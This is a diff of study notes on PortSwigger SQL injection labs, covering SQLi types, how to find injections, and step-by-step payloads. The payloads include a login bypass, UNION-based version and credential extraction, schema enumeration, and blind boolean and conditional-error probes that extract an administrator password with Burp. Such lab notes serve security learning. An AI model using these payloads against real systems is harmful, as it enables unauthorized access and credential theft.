@@ -1,9 +1,10 @@
 # Portswigger lab Scripts with notes
 
 1. What is SQL Injection?
+
 --> Vulnerability that interferes SQL queries that application makes to a database. 
-    Impact: View sensitive information, alter data and delete data.
-    It bypasses SQL queries. Suppose a login page asks for username and password. At username you add admin'-- . The SQL query looks like SELECT * from users where username = 'admin' --, password = . -- comments out rest of the query and ' closes the string, logs in as admin. 
+           Impact: View sensitive information, alter data and delete data.
+           It bypasses SQL queries. Suppose a login page asks for username and password. At username you add admin'-- . The SQL query looks like SELECT * from users where username = 'admin' --, password = . -- comments out rest of the query and ' closes the string, logs in as admin. 
 
 
 2. Types of SQL Injection?
@@ -30,11 +31,16 @@ c. Out-of-band: Using protocol to trigger SQL Injection. Results come to your sy
 
 
 3. How to find SQL Injection?
+
 --> It depends on blackbox(little info given) and whitebox(source-code given)
+
        Blackbox: 
+
               1. Map the aplication: input vectors, endpoints, how app works, etc.
               2. Fuzzing: add SQl characters such as ' or " and look for errors, submit boolean condition, time delay query and out of band query to look for responses.
-       Whitebox: 
+
+       Whitebox:
+
               1. Enable web server and database logging.
               2. Map the application: regex search in code that talk to database.
               3. Code review: Follow code path for input vectors.
@@ -81,7 +87,7 @@ c. Out-of-band: Using protocol to trigger SQL Injection. Results come to your sy
         for mysql and microsoft: 'UNION select @@version,'a'%23
 
 
-***** STEP #3: Finding username and password *****
+***** STEP #4: Finding username and password *****
 
         union select username, password from users--
 
@@ -96,7 +102,7 @@ c. Out-of-band: Using protocol to trigger SQL Injection. Results come to your sy
             administrator~z5wp402vuidu2y59oaai
 
 
-***** STEP #4: Finding Database Content *****
+***** STEP #5: Finding Database Content *****
 
         oracle:	SELECT * FROM all_tables
                 SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE' 
@@ -137,16 +143,17 @@ c. Out-of-band: Using protocol to trigger SQL Injection. Results come to your sy
 
 1. Confirm that the paramter is vulnerable to blind SQLi
 
-cookie query: select tracking-id from tracking-table where trackingId='23f23fdxqd'
+cookie query:   select tracking-id from tracking-table where trackingId='23f23fdxqd'
 
--> If tracking id exists -> query return value -> welcome back msg
--> If tracking id doesn't exists -> query returns nothing -> no welcome msg
+        -> If tracking id exists -> query return value -> welcome back msg
+
+        -> If tracking id doesn't exists -> query returns nothing -> no welcome msg
 
 select tracking-id from tracking-table where trackingId='23f23fdxqd' and 1=1--'
--> TRUE -> WELCOME back msg
+        -> TRUE -> WELCOME back msg
 
 select tracking-id from tracking-table where trackingId='23f23fdxqd' and 1=0--'
--> FALSE -> no WELCOME back msg
+        -> FALSE -> no WELCOME back msg
 
 2. Confirm that we have users table
 
@@ -156,22 +163,27 @@ select tracking-id from tracking-table where trackingId='23f23fdxqd' and (select
 3. Confirm that username administrator exists users table
 
 select tracking-id from tracking-table where trackingId='23f23fdxqd' and (select username from users where username='administrator') = 'administrator'--'
--> administrator user exists
+        -> administrator user exists
 
 4. Enumerate password of the administrator user
 
 select tracking-id from tracking-table where trackingId='23f23fdxqd' and (select username from users where username='administrator' and LENGTH (password)>1) = 'administrator'--' 
--> Use burp to check how many length is there in the password. $1$. 20 returned false, so it contains 20 character.
+        -> Use burp to check how many length is there in the password. $1$. 20 returned false, so it contains 20 character.
 
   **** Using substring to find password. It checks one by one character ****
 
 select tracking-id from tracking-table where trackingId='23f23fdxqd' and (select substring(password,1,1) from users where username='administrator') = 'a'--'
--> burp,(payload-type=bruteforcer): $a$. If 1st letter contains letter 'c' go to 2nd letter.
--> burp payload(cluster-bomb): ' and (select substring(password,$1$,1) from users where username='administrator' and LENGTH (password)>1) = '$a$'--' 
--> 1st type: number from 1 to 20. 2nd type: bruteforcer.
-
-    1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20
-
-    h6yuihlcu58ybxrdatgt
+        -> burp,(payload-type=bruteforcer): $a$. If 1st letter contains letter 'c' go to 2nd letter.
+        -> burp payload(cluster-bomb): ' and (select substring(password,$1$,1) from users where username='administrator' and LENGTH (password)>1) = '$a$'--' 
+        -> 1st type: number from 1 to 20. 2nd type: bruteforcer.
 
 
+
+***** Blind SQLI with conditional errors *****
+
+1. Confirm that the parameter is vulnerable
+
+' || (select '') || '  > 200ok: non-oracle
+' || (select '' from dual) || '  > 200ok: oracle
+
+2. Confirm that the users table exists in the database
